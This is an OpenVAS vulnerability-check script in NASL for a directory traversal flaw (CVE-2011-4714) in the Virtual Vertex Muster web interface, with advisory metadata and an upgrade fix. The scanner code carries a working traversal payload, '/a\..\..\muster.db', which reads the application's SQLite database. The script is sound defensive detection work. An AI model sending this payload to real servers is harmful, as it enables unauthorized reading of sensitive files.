###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_virtual_vertex_muster_web_int_dir_trav_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Virtual Vertex Muster Web Interface Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "Virtual Vertex Muster version 6.1.6";
tag_insight = "The flaw is due to improper validation of URI containing ../(dot dot)
  sequences, which allows attackers to read arbitrary files via directory
  traversal attacks.";
tag_solution = "Upgrade to Virtual Vertex Muster version 6.2.0 or later.
  For updates refer to http://www.vvertex.com/index.php";
tag_summary = "The host is running Virtual Vertex Muster and is prone to directory
  traversal vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802279");
  script_version("$Revision: 9351 $");
  script_cve_id("CVE-2011-4714");
  script_bugtraq_id(50841);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-30 13:13:13 +0530 (Wed, 30 Nov 2011)");
  script_name("Virtual Vertex Muster Web Interface Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46991");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/46991");
  script_xref(name : "URL" , value : "http://www.security-assessment.com/files/documents/advisory/Muster-Arbitrary_File_Download.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8690);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8690);
if(!port){
  port = 8690;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/dologin.html", port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Confirm the application before trying exploit
if("<title>Muster 6 Integrated Web server" >< res)
{
  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:"/a\..\..\muster.db",
                     pattern:"SQLite format", check_header:TRUE)) {
    security_message(port);
  }
}
